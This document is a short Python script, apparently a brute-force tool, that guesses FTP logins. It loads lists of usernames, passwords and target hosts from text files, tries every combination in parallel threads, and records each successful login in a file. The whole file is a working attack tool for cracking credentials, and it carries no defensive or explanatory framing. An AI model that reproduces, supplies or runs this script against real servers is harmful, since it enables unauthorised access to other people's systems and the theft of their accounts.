import threading
import ftplib
import os
import socket

sj=open('save.txt','w')
sj.close()

user=[]
passw=[]
host=[]
def ftp_baopo(username,passwd,host):
    try:
        socket.setdefaulttimeout(5)
        ftp_connect=ftplib.FTP(host)
        ftp_connect.login(user=username,passwd=passwd)
        print('[+]ok host:{} username:{} password:{}'.format(host,username,passwd))
        print('[+]ok host:{} username:{} password:{}'.format(host, username, passwd),file=open('save.txt','a'))
    except Exception as e:
        print('[-]host:{} not username:{} or password:{} or error:{}'.format(host,username,passwd,e))


if __name__ == '__main__':
    dkuser=open('ftp_username.txt','r')
    for u in dkuser.readlines():
        qc="".join(u.split('\n'))
        user.append(qc)
    dkpasswd=open('ftp_password.txt','r')
    for p in dkpasswd.readlines():
        qc2="".join(p.split('\n'))
        passw.append(qc2)

    sru = input('host.txt:')
    if os.path.exists(sru):
        print('[+]ok {}'.format(sru))
    else:
        print('[-]not {}'.format(sru))
        exit()

    dk3 = open('{}'.format(sru), 'r')
    for f in dk3.readlines():
        qc4 = "".join(f.split('\n'))
        host.append(qc4)

    for u1 in user:
        for p1 in passw:
            for h in host:
                t=threading.Thread(target=ftp_baopo,args=(u1,p1,h))
                t.start()
